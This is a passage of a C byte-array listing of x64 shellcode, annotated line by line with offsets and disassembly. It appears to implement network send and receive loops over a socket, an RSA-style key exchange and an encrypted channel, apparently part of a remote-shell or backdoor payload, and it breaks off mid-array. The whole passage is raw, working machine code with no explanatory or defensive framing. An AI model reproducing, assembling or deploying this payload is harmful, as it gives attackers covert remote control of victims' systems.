  /* 0581 */ "\x48\x8d\x0c\x2a"                         /* lea rcx, [rdx+rbp]                 */
  /* 0585 */ "\x48\x85\xc9"                             /* test rcx, rcx                      */
  /* 0588 */ "\x79\xf0"                                 /* jns 0x57a                          */
  /* 058A */ "\x8b\xc8"                                 /* mov ecx, eax                       */
  /* 058C */ "\x4c\x03\xe1"                             /* add r12, rcx                       */
  /* 058F */ "\x2b\xd8"                                 /* sub ebx, eax                       */
  /* 0591 */ "\x75\xac"                                 /* jnz 0x53f                          */
  /* 0593 */ "\x48\x8b\x5c\x24\x60"                     /* mov rbx, [rsp+0x60]                */
  /* 0598 */ "\x48\x8b\x6c\x24\x68"                     /* mov rbp, [rsp+0x68]                */
  /* 059D */ "\x48\x8b\x74\x24\x70"                     /* mov rsi, [rsp+0x70]                */
  /* 05A2 */ "\x48\x83\xc4\x30"                         /* add rsp, 0x30                      */
  /* 05A6 */ "\x41\x5f"                                 /* pop r15                            */
  /* 05A8 */ "\x41\x5e"                                 /* pop r14                            */
  /* 05AA */ "\x41\x5d"                                 /* pop r13                            */
  /* 05AC */ "\x41\x5c"                                 /* pop r12                            */
  /* 05AE */ "\x5f"                                     /* pop rdi                            */
  /* 05AF */ "\xc3"                                     /* ret                                */
  /* 05B0 */ "\x48\x8b\xc4"                             /* mov rax, rsp                       */
  /* 05B3 */ "\x48\x89\x58\x08"                         /* mov [rax+0x8], rbx                 */
  /* 05B7 */ "\x48\x89\x68\x10"                         /* mov [rax+0x10], rbp                */
  /* 05BB */ "\x48\x89\x70\x18"                         /* mov [rax+0x18], rsi                */
  /* 05BF */ "\x57"                                     /* push rdi                           */
  /* 05C0 */ "\x48\x83\xec\x30"                         /* sub rsp, 0x30                      */
  /* 05C4 */ "\x41\x8b\xe9"                             /* mov ebp, r9d                       */
  /* 05C7 */ "\x41\x8b\xd8"                             /* mov ebx, r8d                       */
  /* 05CA */ "\x48\x8b\xfa"                             /* mov rdi, rdx                       */
  /* 05CD */ "\x48\x8b\xf1"                             /* mov rsi, rcx                       */
  /* 05D0 */ "\x41\x83\xf9\x01"                         /* cmp r9d, 0x1                       */
  /* 05D4 */ "\x75\x3a"                                 /* jnz 0x610                          */
  /* 05D6 */ "\x83\xc3\xf4"                             /* add ebx, 0xfffffff4                */
  /* 05D9 */ "\x4c\x8d\x48\xe8"                         /* lea r9, [rax-0x18]                 */
  /* 05DD */ "\x44\x8b\xc3"                             /* mov r8d, ebx                       */
  /* 05E0 */ "\xe8\x5b\xfe\xff\xff"                     /* call 0x440                         */
  /* 05E5 */ "\x48\x8d\x44\x24\x20"                     /* lea rax, [rsp+0x20]                */
  /* 05EA */ "\x48\x8b\x08"                             /* mov rcx, [rax]                     */
  /* 05ED */ "\x48\x3b\x0c\x3b"                         /* cmp rcx, [rbx+rdi]                 */
  /* 05F1 */ "\x75\x0d"                                 /* jnz 0x600                          */
  /* 05F3 */ "\x8b\x48\x08"                             /* mov ecx, [rax+0x8]                 */
  /* 05F6 */ "\x3b\x4c\x3b\x08"                         /* cmp ecx, [rbx+rdi+0x8]             */
  /* 05FA */ "\x75\x04"                                 /* jnz 0x600                          */
  /* 05FC */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 05FE */ "\xeb\x05"                                 /* jmp 0x605                          */
  /* 0600 */ "\x1b\xc0"                                 /* sbb eax, eax                       */
  /* 0602 */ "\x83\xd8\xff"                             /* sbb eax, 0xffffffff                */
  /* 0605 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0607 */ "\x74\x07"                                 /* jz 0x610                           */
  /* 0609 */ "\xb8\xfd\xff\xff\xff"                     /* mov eax, 0xfffffffd                */
  /* 060E */ "\xeb\x2b"                                 /* jmp 0x63b                          */
  /* 0610 */ "\x44\x8b\xc3"                             /* mov r8d, ebx                       */
  /* 0613 */ "\x48\x8b\xd7"                             /* mov rdx, rdi                       */
  /* 0616 */ "\x48\x8b\xce"                             /* mov rcx, rsi                       */
  /* 0619 */ "\xe8\xe2\xfe\xff\xff"                     /* call 0x500                         */
  /* 061E */ "\x85\xed"                                 /* test ebp, ebp                      */
  /* 0620 */ "\x75\x17"                                 /* jnz 0x639                          */
  /* 0622 */ "\x44\x8b\xcb"                             /* mov r9d, ebx                       */
  /* 0625 */ "\x44\x8b\xc3"                             /* mov r8d, ebx                       */
  /* 0628 */ "\x48\x8b\xd7"                             /* mov rdx, rdi                       */
  /* 062B */ "\x4c\x03\xcf"                             /* add r9, rdi                        */
  /* 062E */ "\x48\x8b\xce"                             /* mov rcx, rsi                       */
  /* 0631 */ "\xe8\x0a\xfe\xff\xff"                     /* call 0x440                         */
  /* 0636 */ "\x83\xc3\x0c"                             /* add ebx, 0xc                       */
  /* 0639 */ "\x8b\xc3"                                 /* mov eax, ebx                       */
  /* 063B */ "\x48\x8b\x5c\x24\x40"                     /* mov rbx, [rsp+0x40]                */
  /* 0640 */ "\x48\x8b\x6c\x24\x48"                     /* mov rbp, [rsp+0x48]                */
  /* 0645 */ "\x48\x8b\x74\x24\x50"                     /* mov rsi, [rsp+0x50]                */
  /* 064A */ "\x48\x83\xc4\x30"                         /* add rsp, 0x30                      */
  /* 064E */ "\x5f"                                     /* pop rdi                            */
  /* 064F */ "\xc3"                                     /* ret                                */
  /* 0650 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 0655 */ "\x48\x89\x6c\x24\x10"                     /* mov [rsp+0x10], rbp                */
  /* 065A */ "\x48\x89\x74\x24\x18"                     /* mov [rsp+0x18], rsi                */
  /* 065F */ "\x57"                                     /* push rdi                           */
  /* 0660 */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 0664 */ "\x33\xdb"                                 /* xor ebx, ebx                       */
  /* 0666 */ "\x41\x8b\xf8"                             /* mov edi, r8d                       */
  /* 0669 */ "\x48\x8b\xea"                             /* mov rbp, rdx                       */
  /* 066C */ "\x48\x8b\xf1"                             /* mov rsi, rcx                       */
  /* 066F */ "\x45\x85\xc0"                             /* test r8d, r8d                      */
  /* 0672 */ "\x74\x25"                                 /* jz 0x699                           */
  /* 0674 */ "\x48\x8b\x8e\x00\x09\x00\x00"             /* mov rcx, [rsi+0x900]               */
  /* 067B */ "\x44\x8b\xc7"                             /* mov r8d, edi                       */
  /* 067E */ "\x8b\xd3"                                 /* mov edx, ebx                       */
  /* 0680 */ "\x44\x2b\xc3"                             /* sub r8d, ebx                       */
  /* 0683 */ "\x48\x03\xd5"                             /* add rdx, rbp                       */
  /* 0686 */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 0689 */ "\xff\x96\x88\x00\x00\x00"                 /* call qword [rsi+0x88]              */
  /* 068F */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0691 */ "\x7e\x1d"                                 /* jle 0x6b0                          */
  /* 0693 */ "\x03\xd8"                                 /* add ebx, eax                       */
  /* 0695 */ "\x3b\xdf"                                 /* cmp ebx, edi                       */
  /* 0697 */ "\x72\xdb"                                 /* jb 0x674                           */
  /* 0699 */ "\x8b\xc3"                                 /* mov eax, ebx                       */
  /* 069B */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 06A0 */ "\x48\x8b\x6c\x24\x38"                     /* mov rbp, [rsp+0x38]                */
  /* 06A5 */ "\x48\x8b\x74\x24\x40"                     /* mov rsi, [rsp+0x40]                */
  /* 06AA */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 06AE */ "\x5f"                                     /* pop rdi                            */
  /* 06AF */ "\xc3"                                     /* ret                                */
  /* 06B0 */ "\x83\xc8\xff"                             /* or eax, 0xffffffff                 */
  /* 06B3 */ "\xeb\xe6"                                 /* jmp 0x69b                          */
  /* 06B5 */ "\xcc"                                     /* int3                               */
  /* 06B6 */ "\xcc"                                     /* int3                               */
  /* 06B7 */ "\xcc"                                     /* int3                               */
  /* 06B8 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 06BD */ "\x48\x89\x6c\x24\x10"                     /* mov [rsp+0x10], rbp                */
  /* 06C2 */ "\x48\x89\x74\x24\x18"                     /* mov [rsp+0x18], rsi                */
  /* 06C7 */ "\x57"                                     /* push rdi                           */
  /* 06C8 */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 06CC */ "\x8b\xb1\xe0\x00\x00\x00"                 /* mov esi, [rcx+0xe0]                */
  /* 06D2 */ "\x33\xdb"                                 /* xor ebx, ebx                       */
  /* 06D4 */ "\x48\x8b\xf9"                             /* mov rdi, rcx                       */
  /* 06D7 */ "\x39\x99\x54\x09\x00\x00"                 /* cmp [rcx+0x954], ebx               */
  /* 06DD */ "\x74\x20"                                 /* jz 0x6ff                           */
  /* 06DF */ "\x85\xf6"                                 /* test esi, esi                      */
  /* 06E1 */ "\x74\x09"                                 /* jz 0x6ec                           */
  /* 06E3 */ "\x8d\x46\x0c"                             /* lea eax, [rsi+0xc]                 */
  /* 06E6 */ "\x89\x81\xe0\x00\x00\x00"                 /* mov [rcx+0xe0], eax                */
  /* 06EC */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 06EF */ "\x48\x8d\x91\xe0\x00\x00\x00"             /* lea rdx, [rcx+0xe0]                */
  /* 06F6 */ "\x45\x8d\x41\x04"                         /* lea r8d, [r9+0x4]                  */
  /* 06FA */ "\xe8\xb1\xfe\xff\xff"                     /* call 0x5b0                         */
  /* 06FF */ "\x48\x8d\x97\xe0\x00\x00\x00"             /* lea rdx, [rdi+0xe0]                */
  /* 0706 */ "\x41\xb8\x10\x00\x00\x00"                 /* mov r8d, 0x10                      */
  /* 070C */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 070F */ "\xe8\x3c\xff\xff\xff"                     /* call 0x650                         */
  /* 0714 */ "\x85\xf6"                                 /* test esi, esi                      */
  /* 0716 */ "\x74\x31"                                 /* jz 0x749                           */
  /* 0718 */ "\x39\x9f\x54\x09\x00\x00"                 /* cmp [rdi+0x954], ebx               */
  /* 071E */ "\x74\x17"                                 /* jz 0x737                           */
  /* 0720 */ "\x48\x8d\x97\xf0\x00\x00\x00"             /* lea rdx, [rdi+0xf0]                */
  /* 0727 */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 072A */ "\x44\x8b\xc6"                             /* mov r8d, esi                       */
  /* 072D */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 0730 */ "\xe8\x7b\xfe\xff\xff"                     /* call 0x5b0                         */
  /* 0735 */ "\x8b\xf0"                                 /* mov esi, eax                       */
  /* 0737 */ "\x48\x8d\x97\xf0\x00\x00\x00"             /* lea rdx, [rdi+0xf0]                */
  /* 073E */ "\x44\x8b\xc6"                             /* mov r8d, esi                       */
  /* 0741 */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 0744 */ "\xe8\x07\xff\xff\xff"                     /* call 0x650                         */
  /* 0749 */ "\x48\x8b\x6c\x24\x38"                     /* mov rbp, [rsp+0x38]                */
  /* 074E */ "\x48\x8b\x74\x24\x40"                     /* mov rsi, [rsp+0x40]                */
  /* 0753 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0755 */ "\x0f\x99\xc3"                             /* setns bl                           */
  /* 0758 */ "\x8d\x43\xff"                             /* lea eax, [rbx-0x1]                 */
  /* 075B */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 0760 */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 0764 */ "\x5f"                                     /* pop rdi                            */
  /* 0765 */ "\xc3"                                     /* ret                                */
  /* 0766 */ "\xcc"                                     /* int3                               */
  /* 0767 */ "\xcc"                                     /* int3                               */
  /* 0768 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 076D */ "\x48\x89\x6c\x24\x10"                     /* mov [rsp+0x10], rbp                */
  /* 0772 */ "\x48\x89\x74\x24\x18"                     /* mov [rsp+0x18], rsi                */
  /* 0777 */ "\x57"                                     /* push rdi                           */
  /* 0778 */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 077C */ "\x33\xdb"                                 /* xor ebx, ebx                       */
  /* 077E */ "\x41\x8b\xf8"                             /* mov edi, r8d                       */
  /* 0781 */ "\x48\x8b\xea"                             /* mov rbp, rdx                       */
  /* 0784 */ "\x48\x8b\xf1"                             /* mov rsi, rcx                       */
  /* 0787 */ "\x45\x85\xc0"                             /* test r8d, r8d                      */
  /* 078A */ "\x74\x25"                                 /* jz 0x7b1                           */
  /* 078C */ "\x48\x8b\x8e\x00\x09\x00\x00"             /* mov rcx, [rsi+0x900]               */
  /* 0793 */ "\x44\x8b\xc7"                             /* mov r8d, edi                       */
  /* 0796 */ "\x8b\xd3"                                 /* mov edx, ebx                       */
  /* 0798 */ "\x44\x2b\xc3"                             /* sub r8d, ebx                       */
  /* 079B */ "\x48\x03\xd5"                             /* add rdx, rbp                       */
  /* 079E */ "\x45\x33\xc9"                             /* xor r9d, r9d                       */
  /* 07A1 */ "\xff\x96\x90\x00\x00\x00"                 /* call qword [rsi+0x90]              */
  /* 07A7 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 07A9 */ "\x7e\x1d"                                 /* jle 0x7c8                          */
  /* 07AB */ "\x03\xd8"                                 /* add ebx, eax                       */
  /* 07AD */ "\x3b\xdf"                                 /* cmp ebx, edi                       */
  /* 07AF */ "\x72\xdb"                                 /* jb 0x78c                           */
  /* 07B1 */ "\x8b\xc3"                                 /* mov eax, ebx                       */
  /* 07B3 */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 07B8 */ "\x48\x8b\x6c\x24\x38"                     /* mov rbp, [rsp+0x38]                */
  /* 07BD */ "\x48\x8b\x74\x24\x40"                     /* mov rsi, [rsp+0x40]                */
  /* 07C2 */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 07C6 */ "\x5f"                                     /* pop rdi                            */
  /* 07C7 */ "\xc3"                                     /* ret                                */
  /* 07C8 */ "\x83\xc8\xff"                             /* or eax, 0xffffffff                 */
  /* 07CB */ "\xeb\xe6"                                 /* jmp 0x7b3                          */
  /* 07CD */ "\xcc"                                     /* int3                               */
  /* 07CE */ "\xcc"                                     /* int3                               */
  /* 07CF */ "\xcc"                                     /* int3                               */
  /* 07D0 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 07D5 */ "\x48\x89\x6c\x24\x10"                     /* mov [rsp+0x10], rbp                */
  /* 07DA */ "\x48\x89\x74\x24\x18"                     /* mov [rsp+0x18], rsi                */
  /* 07DF */ "\x57"                                     /* push rdi                           */
  /* 07E0 */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 07E4 */ "\xbd\x10\x00\x00\x00"                     /* mov ebp, 0x10                      */
  /* 07E9 */ "\x48\x8d\x91\xe0\x00\x00\x00"             /* lea rdx, [rcx+0xe0]                */
  /* 07F0 */ "\x48\x8b\xf9"                             /* mov rdi, rcx                       */
  /* 07F3 */ "\x44\x8b\xc5"                             /* mov r8d, ebp                       */
  /* 07F6 */ "\xe8\x6d\xff\xff\xff"                     /* call 0x768                         */
  /* 07FB */ "\x33\xdb"                                 /* xor ebx, ebx                       */
  /* 07FD */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 07FF */ "\x7f\x08"                                 /* jg 0x809                           */
  /* 0801 */ "\x83\xc8\xff"                             /* or eax, 0xffffffff                 */
  /* 0804 */ "\xe9\xb6\x00\x00\x00"                     /* jmp 0x8bf                          */
  /* 0809 */ "\x39\x9f\x54\x09\x00\x00"                 /* cmp [rdi+0x954], ebx               */
  /* 080F */ "\x74\x26"                                 /* jz 0x837                           */
  /* 0811 */ "\x48\x8d\x97\xe0\x00\x00\x00"             /* lea rdx, [rdi+0xe0]                */
  /* 0818 */ "\x41\xb9\x01\x00\x00\x00"                 /* mov r9d, 0x1                       */
  /* 081E */ "\x44\x8b\xc5"                             /* mov r8d, ebp                       */
  /* 0821 */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 0824 */ "\xe8\x87\xfd\xff\xff"                     /* call 0x5b0                         */
  /* 0829 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 082B */ "\x79\x0a"                                 /* jns 0x837                          */
  /* 082D */ "\xb8\xfc\xff\xff\xff"                     /* mov eax, 0xfffffffc                */
  /* 0832 */ "\xe9\x88\x00\x00\x00"                     /* jmp 0x8bf                          */
  /* 0837 */ "\x66\x39\x9f\xe0\x00\x00\x00"             /* cmp [rdi+0xe0], bx                 */
  /* 083E */ "\x75\x04"                                 /* jnz 0x844                          */
  /* 0840 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 0842 */ "\xeb\x7b"                                 /* jmp 0x8bf                          */
  /* 0844 */ "\xb8\x0c\x08\x00\x00"                     /* mov eax, 0x80c                     */
  /* 0849 */ "\x66\x39\x87\xe0\x00\x00\x00"             /* cmp [rdi+0xe0], ax                 */
  /* 0850 */ "\x76\x07"                                 /* jbe 0x859                          */
  /* 0852 */ "\xb8\xfe\xff\xff\xff"                     /* mov eax, 0xfffffffe                */
  /* 0857 */ "\xeb\x66"                                 /* jmp 0x8bf                          */
  /* 0859 */ "\x66\x39\xaf\xe2\x00\x00\x00"             /* cmp [rdi+0xe2], bp                 */
  /* 0860 */ "\x73\xf0"                                 /* jae 0x852                          */
  /* 0862 */ "\x44\x0f\xb7\x87\xe0\x00\x00\x00"         /* movzx r8d, word [rdi+0xe0]         */
  /* 086A */ "\x48\x8d\x97\xf0\x00\x00\x00"             /* lea rdx, [rdi+0xf0]                */
  /* 0871 */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 0874 */ "\xe8\xef\xfe\xff\xff"                     /* call 0x768                         */
  /* 0879 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 087B */ "\x7e\x84"                                 /* jle 0x801                          */
  /* 087D */ "\x39\x9f\x54\x09\x00\x00"                 /* cmp [rdi+0x954], ebx               */
  /* 0883 */ "\x74\x32"                                 /* jz 0x8b7                           */
  /* 0885 */ "\x44\x0f\xb7\x87\xe0\x00\x00\x00"         /* movzx r8d, word [rdi+0xe0]         */
  /* 088D */ "\x48\x8d\x97\xf0\x00\x00\x00"             /* lea rdx, [rdi+0xf0]                */
  /* 0894 */ "\x41\xb9\x01\x00\x00\x00"                 /* mov r9d, 0x1                       */
  /* 089A */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 089D */ "\xe8\x0e\xfd\xff\xff"                     /* call 0x5b0                         */
  /* 08A2 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 08A4 */ "\x78\x87"                                 /* js 0x82d                           */
  /* 08A6 */ "\x48\x63\xc8"                             /* movsxd rcx, eax                    */
  /* 08A9 */ "\x66\x89\x87\xe0\x00\x00\x00"             /* mov [rdi+0xe0], ax                 */
  /* 08B0 */ "\x88\x9c\x39\xf0\x00\x00\x00"             /* mov [rcx+rdi+0xf0], bl             */
  /* 08B7 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 08B9 */ "\x0f\x9f\xc3"                             /* setg bl                            */
  /* 08BC */ "\x8d\x43\xff"                             /* lea eax, [rbx-0x1]                 */
  /* 08BF */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 08C4 */ "\x48\x8b\x6c\x24\x38"                     /* mov rbp, [rsp+0x38]                */
  /* 08C9 */ "\x48\x8b\x74\x24\x40"                     /* mov rsi, [rsp+0x40]                */
  /* 08CE */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 08D2 */ "\x5f"                                     /* pop rdi                            */
  /* 08D3 */ "\xc3"                                     /* ret                                */
  /* 08D4 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 08D9 */ "\x57"                                     /* push rdi                           */
  /* 08DA */ "\x48\x81\xec\x40\x01\x00\x00"             /* sub rsp, 0x140                     */
  /* 08E1 */ "\x48\x8b\xf9"                             /* mov rdi, rcx                       */
  /* 08E4 */ "\x48\x8b\x89\x58\x09\x00\x00"             /* mov rcx, [rcx+0x958]               */
  /* 08EB */ "\xbb\x40\x00\x00\x00"                     /* mov ebx, 0x40                      */
  /* 08F0 */ "\x4c\x8d\x44\x24\x20"                     /* lea r8, [rsp+0x20]                 */
  /* 08F5 */ "\x8b\xd3"                                 /* mov edx, ebx                       */
  /* 08F7 */ "\xff\x97\xd0\x00\x00\x00"                 /* call qword [rdi+0xd0]              */
  /* 08FD */ "\x48\x8d\x4c\x24\x60"                     /* lea rcx, [rsp+0x60]                */
  /* 0902 */ "\x8b\xd3"                                 /* mov edx, ebx                       */
  /* 0904 */ "\xe8\x77\x0a\x00\x00"                     /* call 0x1380                        */
  /* 0909 */ "\x48\x8d\x54\x24\x20"                     /* lea rdx, [rsp+0x20]                */
  /* 090E */ "\x48\x8d\x4c\x24\x60"                     /* lea rcx, [rsp+0x60]                */
  /* 0913 */ "\x44\x8b\xc3"                             /* mov r8d, ebx                       */
  /* 0916 */ "\xe8\x91\x0a\x00\x00"                     /* call 0x13ac                        */
  /* 091B */ "\x48\x8d\x54\x24\x60"                     /* lea rdx, [rsp+0x60]                */
  /* 0920 */ "\x48\x8d\x8f\x60\x09\x00\x00"             /* lea rcx, [rdi+0x960]               */
  /* 0927 */ "\xe8\xd8\x0a\x00\x00"                     /* call 0x1404                        */
  /* 092C */ "\x48\x8d\x97\xa0\x11\x00\x00"             /* lea rdx, [rdi+0x11a0]              */
  /* 0933 */ "\x48\x8d\x8f\x60\x09\x00\x00"             /* lea rcx, [rdi+0x960]               */
  /* 093A */ "\xe8\x81\x0d\x00\x00"                     /* call 0x16c0                        */
  /* 093F */ "\x48\x8b\x9c\x24\x50\x01\x00\x00"         /* mov rbx, [rsp+0x150]               */
  /* 0947 */ "\x48\x81\xc4\x40\x01\x00\x00"             /* add rsp, 0x140                     */
  /* 094E */ "\x5f"                                     /* pop rdi                            */
  /* 094F */ "\xc3"                                     /* ret                                */
  /* 0950 */ "\x48\x8b\xc4"                             /* mov rax, rsp                       */
  /* 0953 */ "\x48\x89\x58\x08"                         /* mov [rax+0x8], rbx                 */
  /* 0957 */ "\x48\x89\x70\x10"                         /* mov [rax+0x10], rsi                */
  /* 095B */ "\x48\x89\x78\x18"                         /* mov [rax+0x18], rdi                */
  /* 095F */ "\x4c\x89\x60\x20"                         /* mov [rax+0x20], r12                */
  /* 0963 */ "\x55"                                     /* push rbp                           */
  /* 0964 */ "\x48\x8d\xa8\xd8\x80\xff\xff"             /* lea rbp, [rax-0x7f28]              */
  /* 096B */ "\xb8\x20\x80\x00\x00"                     /* mov eax, 0x8020                    */
  /* 0970 */ "\xe8\x6b\x13\x00\x00"                     /* call 0x1ce0                        */
  /* 0975 */ "\x48\x2b\xe0"                             /* sub rsp, rax                       */
  /* 0978 */ "\x4c\x8b\xe1"                             /* mov r12, rcx                       */
  /* 097B */ "\xe8\x54\xff\xff\xff"                     /* call 0x8d4                         */
  /* 0980 */ "\x48\x8d\x8d\x20\x3f\x00\x00"             /* lea rcx, [rbp+0x3f20]              */
  /* 0987 */ "\xe8\x8c\x0f\x00\x00"                     /* call 0x1918                        */
  /* 098C */ "\x48\x8d\x8d\x20\x1f\x00\x00"             /* lea rcx, [rbp+0x1f20]              */
  /* 0993 */ "\xe8\x80\x0f\x00\x00"                     /* call 0x1918                        */
  /* 0998 */ "\x48\x8d\x4c\x24\x20"                     /* lea rcx, [rsp+0x20]                */
  /* 099D */ "\xe8\x76\x0f\x00\x00"                     /* call 0x1918                        */
  /* 09A2 */ "\x49\x8b\xcc"                             /* mov rcx, r12                       */
  /* 09A5 */ "\xc7\x85\x20\x1f\x00\x00\x01\x00\x01\x00" /* mov dword [rbp+0x1f20], 0x10001    */
  /* 09AF */ "\xe8\x1c\xfe\xff\xff"                     /* call 0x7d0                         */
  /* 09B4 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 09B6 */ "\x0f\x85\x99\x00\x00\x00"                 /* jnz 0xa55                          */
  /* 09BC */ "\x41\x0f\xb7\x8c\x24\xe0\x00\x00\x00"     /* movzx ecx, word [r12+0xe0]         */
  /* 09C5 */ "\x48\x8d\x7c\x24\x20"                     /* lea rdi, [rsp+0x20]                */
  /* 09CA */ "\x49\x8d\xb4\x24\xf0\x00\x00\x00"         /* lea rsi, [r12+0xf0]                */
  /* 09D2 */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 09D4 */ "\x8d\x48\x40"                             /* lea ecx, [rax+0x40]                */
  /* 09D7 */ "\x49\x8d\xb4\x24\x60\x09\x00\x00"         /* lea rsi, [r12+0x960]               */
  /* 09DF */ "\x48\x8d\xbd\x20\x3f\x00\x00"             /* lea rdi, [rbp+0x3f20]              */
  /* 09E6 */ "\x4c\x8d\x85\x60\x3f\x00\x00"             /* lea r8, [rbp+0x3f60]               */
  /* 09ED */ "\xba\xbe\x00\x00\x00"                     /* mov edx, 0xbe                      */
  /* 09F2 */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 09F4 */ "\x49\x8b\x8c\x24\x58\x09\x00\x00"         /* mov rcx, [r12+0x958]               */
  /* 09FC */ "\x41\xff\x94\x24\xd0\x00\x00\x00"         /* call qword [r12+0xd0]              */
  /* 0A04 */ "\x4c\x8d\x4c\x24\x20"                     /* lea r9, [rsp+0x20]                 */
  /* 0A09 */ "\x4c\x8d\x85\x20\x1f\x00\x00"             /* lea r8, [rbp+0x1f20]               */
  /* 0A10 */ "\x48\x8d\x95\x20\x3f\x00\x00"             /* lea rdx, [rbp+0x3f20]              */
  /* 0A17 */ "\x48\x8d\x8d\x20\x5f\x00\x00"             /* lea rcx, [rbp+0x5f20]              */
  /* 0A1E */ "\xe8\xa5\x11\x00\x00"                     /* call 0x1bc8                        */
  /* 0A23 */ "\x41\x8b\x8c\x24\xe0\x00\x00\x00"         /* mov ecx, [r12+0xe0]                */
  /* 0A2B */ "\x48\x8d\xb5\x20\x5f\x00\x00"             /* lea rsi, [rbp+0x5f20]              */
  /* 0A32 */ "\x49\x8d\xbc\x24\xf0\x00\x00\x00"         /* lea rdi, [r12+0xf0]                */
  /* 0A3A */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 0A3C */ "\x49\x8b\xcc"                             /* mov rcx, r12                       */
  /* 0A3F */ "\xe8\x74\xfc\xff\xff"                     /* call 0x6b8                         */
  /* 0A44 */ "\x85\xc0"                                 /* test eax, eax                      */
  /* 0A46 */ "\x75\x0d"                                 /* jnz 0xa55                          */
  /* 0A48 */ "\xb8\x01\x00\x00\x00"                     /* mov eax, 0x1                       */
  /* 0A4D */ "\x41\x89\x84\x24\x54\x09\x00\x00"         /* mov [r12+0x954], eax               */
  /* 0A55 */ "\x4c\x8d\x9c\x24\x20\x80\x00\x00"         /* lea r11, [rsp+0x8020]              */
  /* 0A5D */ "\x49\x8b\x5b\x10"                         /* mov rbx, [r11+0x10]                */
  /* 0A61 */ "\x49\x8b\x73\x18"                         /* mov rsi, [r11+0x18]                */
  /* 0A65 */ "\x49\x8b\x7b\x20"                         /* mov rdi, [r11+0x20]                */
  /* 0A69 */ "\x4d\x8b\x63\x28"                         /* mov r12, [r11+0x28]                */
  /* 0A6D */ "\x49\x8b\xe3"                             /* mov rsp, r11                       */
  /* 0A70 */ "\x5d"                                     /* pop rbp                            */
  /* 0A71 */ "\xc3"                                     /* ret                                */
  /* 0A72 */ "\xcc"                                     /* int3                               */
  /* 0A73 */ "\xcc"                                     /* int3                               */
  /* 0A74 */ "\x48\x89\x5c\x24\x10"                     /* mov [rsp+0x10], rbx                */
  /* 0A79 */ "\x48\x89\x6c\x24\x18"                     /* mov [rsp+0x18], rbp                */
  /* 0A7E */ "\x48\x89\x74\x24\x20"                     /* mov [rsp+0x20], rsi                */
  /* 0A83 */ "\x57"                                     /* push rdi                           */
  /* 0A84 */ "\x48\x83\xec\x50"                         /* sub rsp, 0x50                      */
  /* 0A88 */ "\x48\x8b\x91\x28\x09\x00\x00"             /* mov rdx, [rcx+0x928]               */
  /* 0A8F */ "\x48\x8b\xf1"                             /* mov rsi, rcx                       */
  /* 0A92 */ "\x48\x8b\x89\x00\x09\x00\x00"             /* mov rcx, [rcx+0x900]               */
  /* 0A99 */ "\x41\xb8\x21\x00\x00\x00"                 /* mov r8d, 0x21                      */
  /* 0A9F */ "\xff\x96\xa8\x00\x00\x00"                 /* call qword [rsi+0xa8]              */
  /* 0AA5 */ "\x8b\x8e\x50\x09\x00\x00"                 /* mov ecx, [rsi+0x950]               */
  /* 0AAB */ "\x83\xcd\xff"                             /* or ebp, 0xffffffff                 */
  /* 0AAE */ "\x48\x8d\x96\x28\x09\x00\x00"             /* lea rdx, [rsi+0x928]               */
  /* 0AB5 */ "\x44\x8b\xcd"                             /* mov r9d, ebp                       */
  /* 0AB8 */ "\x45\x33\xc0"                             /* xor r8d, r8d                       */
  /* 0ABB */ "\xff\x56\x60"                             /* call qword [rsi+0x60]              */
  /* 0ABE */ "\x48\x8b\x96\x28\x09\x00\x00"             /* mov rdx, [rsi+0x928]               */
  /* 0AC5 */ "\x48\x8b\x8e\x00\x09\x00\x00"             /* mov rcx, [rsi+0x900]               */
  /* 0ACC */ "\x4c\x8d\x44\x24\x20"                     /* lea r8, [rsp+0x20]                 */
  /* 0AD1 */ "\x8b\xf8"                                 /* mov edi, eax                       */
  /* 0AD3 */ "\xff\x96\xb0\x00\x00\x00"                 /* call qword [rsi+0xb0]              */
  /* 0AD9 */ "\x48\x8b\x96\x28\x09\x00\x00"             /* mov rdx, [rsi+0x928]               */
